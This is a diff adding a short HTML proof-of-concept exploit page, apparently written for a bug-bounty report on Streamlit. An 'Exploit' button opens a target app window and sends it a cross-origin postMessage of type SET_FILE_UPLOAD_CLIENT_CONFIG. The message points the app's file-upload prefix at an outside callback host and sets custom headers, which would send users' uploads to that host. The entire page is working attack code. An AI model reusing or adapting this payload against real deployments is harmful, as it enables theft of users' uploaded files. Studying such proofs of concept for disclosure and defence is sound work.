@@ -1,0 +1,21 @@
+<button onclick="exploit()">Exploit</button>
+
+<script>
+    function test() {
+        console.log('Iframe loaded')
+    }
+
+    function exploit(){
+        const w = window.open ('https://activate-fwwrn5gbiq-ey.a.run.app', 'poc-streamlit');
+
+        setTimeout(() => {
+            confirm('Sending message ?')
+            w.postMessage({
+                stCommVersion: 1,
+                type: "SET_FILE_UPLOAD_CLIENT_CONFIG",
+                prefix: "https://bq5c068xqkjkc1y9uqhoew5cv31upkd9.i.ywh.at",
+                headers: {"abc":"def"}
+            }, 'https://activate-fwwrn5gbiq-ey.a.run.app');
+        }, 2000);
+    }
+</script>
